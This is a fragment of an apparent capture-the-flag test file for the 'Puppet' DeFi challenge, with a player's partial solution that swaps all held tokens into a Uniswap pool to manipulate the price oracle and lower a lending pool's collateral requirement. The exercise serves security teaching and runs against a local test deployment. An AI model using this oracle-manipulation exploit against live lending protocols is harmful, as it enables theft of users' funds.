...
describe('[Challenge] Puppet', function () {
    ...
    before(async function () {
        ...
        //console.log(uniswapExchange.interface);
    ...
    it('Execution', async function () {
        ...
        let bal = await ethers.provider.getBalance(uniswapExchange.address);
        //console.log(ethers.utils.formatEther(bal.toString()));
        //console.log(await uniswapExchange.getEthToTokenInputPrice(10n ** 18n,{gasLimit:1e6}));
        await token.connect(player).approve(uniswapExchange.address,PLAYER_INITIAL_TOKEN_BALANCE);
        //await console.log(await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
        await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE,1n,(await ethers.provider.getBlock('latest')).timestamp +50);
        console.log(await ethers.provider.getBalance(player.address));
        console.log(await token.balanceOf(player.address));
        //await console.log(await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
       // await uniswapExchange.connect(player).ethToTokenSwapInput(1n, (await ethers.provider.getBlock('latest')).timestamp*3, {value:25n * 10n ** 18n,gasLimit:1e7});
        ...
        console.log(await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
        console.log(await ethers.provider.getBalance(player.address));
